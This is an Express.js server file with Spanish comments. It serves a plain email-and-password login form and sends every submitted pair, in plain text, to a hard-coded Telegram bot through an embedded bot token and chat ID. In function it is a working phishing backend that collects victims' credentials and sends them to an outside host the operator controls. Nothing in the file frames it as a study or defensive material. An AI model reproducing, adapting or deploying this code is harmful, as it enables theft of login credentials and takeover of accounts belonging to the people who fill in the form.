const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");

const app = express();
const port = 3000;

// Token del bot y tu ID de chat
const botToken = "7768024145:AAG0JBunDMPaTgB3s7aftsR6fIUyW5gQ_tg";
const chatId = "5635061204";

// Middleware para procesar datos JSON
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Ruta para mostrar el formulario (puedes reemplazar esto por un frontend HTML)
app.get("/", (req, res) => {
  res.send(`
    <form action="/send" method="POST">
      <label for="email">Correo electrónico:</label><br>
      <input type="email" id="email" name="email" required><br>
      <label for="password">Contraseña:</label><br>
      <input type="password" id="password" name="password" required><br><br>
      <button type="submit">Enviar</button>
    </form>
  `);
});

// Ruta para manejar el envío del formulario
app.post("/send", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).send("Correo y contraseña son obligatorios.");
  }

  const message = `🔐 Nuevo envío de formulario:
  📧 Correo: ${email}
  🔑 Contraseña: ${password}`;

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
    });

    res.send("Datos enviados exitosamente al bot de Telegram.");
  } catch (error) {
    console.error("Error al enviar mensaje al bot:", error.message);
    res.status(500).send("Error al enviar datos al bot de Telegram.");
  }
});

// Iniciar el servidor
app.listen(port, () => {
  console.log(`Servidor funcionando en http://localhost:${port}`);
});
